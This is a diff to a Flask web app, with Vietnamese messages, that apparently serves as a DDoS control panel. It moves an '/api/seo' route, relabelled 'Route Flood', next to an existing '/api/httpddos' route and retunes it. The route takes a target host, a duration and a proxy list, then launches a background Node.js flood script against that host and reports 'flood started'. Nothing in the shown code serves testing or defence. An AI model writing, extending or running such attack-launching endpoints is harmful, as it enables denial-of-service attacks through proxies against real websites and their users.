@@ -120,6 +120,34 @@ def run_browser():
         return jsonify({"error": f"Lỗi khi chạy browser.js: {err}"}), 500
 
     return jsonify({"status": "browser đã khởi động", "host": host, "proxy": proxy_file})
+    # Route Flood
+@app.route('/api/seo', methods=['GET'])
+def run_flood():
+    host = request.args.get('host')
+    time_param = request.args.get('time')
+    proxy_key = request.args.get('proxy', 'vn').lower()
+
+    if not host or not time_param:
+        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400
+
+    prx_flag, proxy_file = get_proxy_file(proxy_key)
+    if not proxy_file:
+        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400
+
+    ok, err = run_prx_script(prx_flag)
+    if not ok:
+        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500
+
+    if not os.path.exists(proxy_file):
+        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500
+
+    cmd = ["node", "ya", host, time_param, "8", "45", proxy_file]
+    ok, err = start_background_node(cmd)
+    if not ok:
+        return jsonify({"error": f"Lỗi khi chạy seo: {err}"}), 500
+
+    return jsonify({"status": "flood đã khởi động", "host": host, "proxy": proxy_file})
+
 # Route HTTPDDOS
 @app.route('/api/httpddos', methods=['GET'])
 def run_httpddos():
@@ -148,36 +176,7 @@ def run_httpddos():
         return jsonify({"error": f"Lỗi khi chạy httpddos: {err}"}), 500
 
     return jsonify({"status": "httpddos đã khởi động", "host": host, "proxy": proxy_file})
-# Route seo
-@app.route('/api/seo', methods=['GET'])
-def run_httpddos():
-    host = request.args.get('host')
-    time_param = request.args.get('time')
-    proxy_key = request.args.get('proxy', 'vn').lower()
 
-    if not host or not time_param:
-        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400
-
-    prx_flag, proxy_file = get_proxy_file(proxy_key)
-    if not proxy_file:
-        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400
-
-    ok, err = run_prx_script(prx_flag)
-    if not ok:
-        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500
-
-    if not os.path.exists(proxy_file):
-        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500
-
-    # Command: node <target> <time> 8 45 <proxy-file>
-    cmd = ["node", "ya", host, time_param, "15", "20", proxy_file]
-    ok, err = start_background_node(cmd)
-    if not ok:
-        return jsonify({"error": f"Lỗi khi chạy httpddos: {err}"}), 500
-
-    return jsonify({"status": "httpddos đã khởi động", "host": host, "proxy": proxy_file})
-
-# Route dừng toàn bộ tiến trình Node.js
 @app.route('/api/stop', methods=['GET'])
 def stop_all_nodes():
     try:
